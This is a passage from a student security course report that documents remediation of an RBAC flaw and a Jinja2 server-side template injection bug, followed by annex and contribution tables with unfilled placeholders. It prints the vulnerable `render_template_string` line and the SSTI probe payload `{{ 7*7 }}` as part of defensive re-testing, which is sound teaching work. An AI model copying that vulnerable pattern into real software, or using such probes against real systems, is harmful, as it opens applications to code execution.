- Member and Viewer session cookies used to request `/admin/users`.
- Response: `HTTP 403 Forbidden` for both.
- Pipeline: ✅ Pass.

*Screenshot (post-fix — re-test):* Viewer navigates to `https://localhost:5000/admin` and is redirected to the dashboard with `"You do not have permission to access that page."`:

![VUL-03 (6.2): Viewer access to /admin rejected — RBAC enforced](docs/images/vul03_admin_denied.png)

---

#### Fix: VUL-06 — SSTI via `render_template_string()`

**Root Cause:** Feedback content submitted by users was passed directly as a Jinja2 template string, enabling arbitrary template expression evaluation.

*Before:*
```python
return render_template_string(feedback.content)
```

*After:*
```python
return render_template('admin/feedback.html', content=feedback.content)
```

The `feedback.html` template renders `{{ content | e }}` — Jinja2's autoescape sanitises the value before rendering.

**Re-Test:** SSTI payload `{{ 7*7 }}` submitted as feedback — rendered as literal text `{{ 7*7 }}`, not `49`. Pipeline: ✅ Pass.

---

> *[Apply same template for VUL-04, VUL-05, VUL-07–VUL-10]*

---

## 7. Report Quality & Annexes

### 7.1 Annexes

| Annex | Contents |
|-------|---------|
| **Annex A** | Full SAST tool output (CodeQL / Semgrep raw results) |
| **Annex B** | OWASP ZAP DAST HTML Report — pre-fix |
| **Annex C** | SCA Report — npm audit / Dependency-Check output |
| **Annex D** | OWASP ZAP DAST HTML Report — post-fix (re-test) |
| **Annex E** | GitHub Actions pipeline run screenshots (pre-fix fail + post-fix pass) |
| **Annex F** | Burp Suite HTTP request/response evidence for all exploits |
| **Annex G** | CONTRIBUTIONS.md — team contribution breakdown |

---

## 8. Member Contributions

> *All three members made meaningful commits across all four weeks. Commit history is visible in the GitHub repository and reflects distributed, role-specific work.*

| Member | Role | Key Contributions | Commits |
|--------|------|------------------|---------|
| [Member 1] | App Developer | Designed and built core CRUD features, RBAC implementation, Docker setup | [N] commits |
| [Member 2] | Security Engineer | Configured CI/CD pipeline (SAST/DAST/SCA), wrote pipeline quality gates, managed GitHub Issues | [N] commits |
| [Member 3] | Pentester / Report | Performed manual pentesting, wrote exploitation report, led remediation, authored final report | [N] commits |

> *Individual contributions are documented in `CONTRIBUTIONS.md` in the repository root. Each member's commit messages follow the `fix #N: description` format as per course guidelines.*

**GitHub Contribution Graph:** [Insert screenshot]

---

*End of Report*

---

> **Prepared by:** Group 1
> **GitHub Repository:** [[URL](https://github.com/IfrahC/Build-and-Break-Secure-Application-Pipeline)] | **Deployment URL:** `https://[hostname]`